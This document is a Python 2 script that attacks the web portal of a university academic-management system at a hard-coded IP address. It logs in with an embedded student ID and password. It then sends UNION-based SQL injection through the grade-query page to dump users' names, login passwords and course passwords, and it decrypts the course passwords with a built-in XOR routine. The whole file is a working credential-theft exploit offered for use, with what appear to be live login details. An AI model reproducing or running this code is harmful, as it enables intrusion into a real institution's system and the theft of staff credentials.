#! /usr/bin/env python
# coding=utf-8
 
import sys
import requests
 
url_root = 'http://210.44.64.154/default5.aspx'
url_login = ''
url_query = ''
 
cookie = {}
 
def help():
  print 'Usage : ', sys.argv[0], 'www.jxgl.com user pass'
   
def login():
  global cookie
  r = requests.get(url_root)
  t = r.headers['set-cookie'].split(';')[0].split('=')
  cookie[t[0]] = t[1]
  postdata = {}
  t = r.content[r.content.find('__VIEWSTATE') + 20:]
  t = t[:t.find('"')]
  postdata['__VIEWSTATE'] = t
  postdata['TextBox1'] = '10051517'#sys.argv[2]
  postdata['TextBox2'] = '389264167'#sys.argv[3]
  postdata['Button1'] = ''
  postdata['Button2'] = ''
  postdata['RadioButtonList1'] = '学生'.decode('utf-8').encode('gbk')
  r = requests.post(url_login, cookies=cookie, data=postdata)
  if len(r.history) == 0:
    print '登陆失败'
    sys.exit()
 
def query(sql):
  global url_query, cookie
  result = []
  header = {}
  header['Referer'] = url_root
  header['Host'] = 'http://210.44.64.154/default5.aspx'
  r = requests.get(url_query, cookies=cookie, headers=header)
  t = r.content.decode('gbk').encode('utf-8')
  t = t[t.find('__VIEWSTATE')+20:]
  t = t[:t.find('"')]
  postdata = {}
  postdata['__VIEWSTATE'] = t
  postdata['Dropdownlist5'] = ''
  postdata['Dropdownlist3'] = 'a.xh'
  postdata['Dropdownlist4'] = ''
  postdata['Dropdownlist1'] = ''
  postdata['Dropdownlist2'] = ''
  postdata['Button5'] = '查  询'.decode('utf-8').encode('gbk')
  postdata['TextBox1'] = sql
  r = requests.post(url_query, data=postdata, cookies=cookie, headers=header)
  t = r.content.decode('gbk').encode('utf-8')
  t = t[t.find('Dropdownlist4">')+15:]
  t = t[:t.find('</select>')]
  while True:
    pos = t.find('">')
    if pos == -1:
      break
    t = t[pos + 2:]
    x = t[:t.find('</option>')]
    t = t[t.find('</option>') + 9:]
    result.append(x)
  return result
 
def main():
  global url_root, url_login, url_query
  #url_root = 'http://' + sys.argv[1] + '/'
  url_login = url_root + 'default2.aspx'
  url_query = url_root + 'cjcx.aspx?xh=10051517'# + sys.argv[2]
  login()
  xm = query("888888' union select yhm||xm yhm,xm from yhb where xm like '%" + sys.argv[1].decode('utf-8').encode('gbk'))
  yhm = query("888888' union select yhm||yhm yhm,yhm from yhb where xm like '%" + sys.argv[1].decode('utf-8').encode('gbk'))
  jsmm = query("888888' union select yhm||jsmm yhm,jsmm from yhb where xm like '%" + sys.argv[1].decode('utf-8').encode('gbk'))
  jskcmm = query("888888' union select yhm||jskcmm yhm,jskcmm from yhb where xm like '%" + sys.argv[1].decode('utf-8').encode('gbk'))
  print ''
  print '%-12s%-13s%-16s%-16s' % ('姓名', '用户名', '登录密码', '课程密码')
  print '--------------------------------------------------------'
  for i in range(len(xm)):
    xm[i] = xm[i][5:]
    yhm[i] = yhm[i][5:]
    jsmm[i] = jsmm[i][5:]
    jskcmm[i] = jskcmm[i][5:]
    if len(xm[i]) == 6:
      xm[i] = xm[i][:3] + '  ' + xm[i][3:]
      jskcmm[i] = decode(jskcmm[i])
    else:
      yhm[i] = ' ' + yhm[i]
      jsmm[i] = ' ' + jsmm[i]
      jskcmm[i] = ' ' + decode(jskcmm[i])
    print '%-12s%-10s%-16s%-16s' % (xm[i], yhm[i], jsmm[i], jskcmm[i])
  print ''
   
def decode(src):
  key = 'Encrypt01'
  str3 = ''
  num3 = 0
  num4 = len(src)
  if len(src) % 2 == 0:
    str4 = src[:num4/2]
    str4 = str4[::-1]
    str5 = src[num4/2:]
    str5 = str5[::-1]
    src = str4 + str5
  for i in range(num4):
    str6 = src[i:i+1]
    str2 = key[num3:num3+1]
    if ((ord(str6[0]) ^ ord(str2[0])) < 0x20) or ((ord(str6[0]) ^ ord(str2[0])) > 0x7E) or (ord(str6[0]) < 0) or (ord(str6[0]) > 0xFF):
      str3 = str3 + str6
    else:
      str3 = str3 + str(chr(ord(str6[0]) ^ ord(str2[0])))
    num3 = num3 + 1
    if num3 == len(key):
      num3 = 0
  return str3
 
 
if __name__ == '__main__':
  if len(sys.argv) != 2:
    help()
    sys.exit()
  main()